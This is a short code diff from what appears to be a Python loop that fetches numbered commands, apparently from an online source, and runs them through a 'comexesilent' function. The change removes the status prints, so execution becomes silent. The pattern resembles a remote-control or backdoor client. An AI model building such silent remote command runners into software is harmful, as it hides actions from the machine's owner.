@@ -45,9 +45,7 @@ while True:
 
     if code_status is False:
         allfunction.comexesilent(new_command)
-        print("command executed")
-    else:
-        print("no new command")    
+        
     #command number online will be replaced on last_code file
 
     with open("last_code", "w") as replacer:
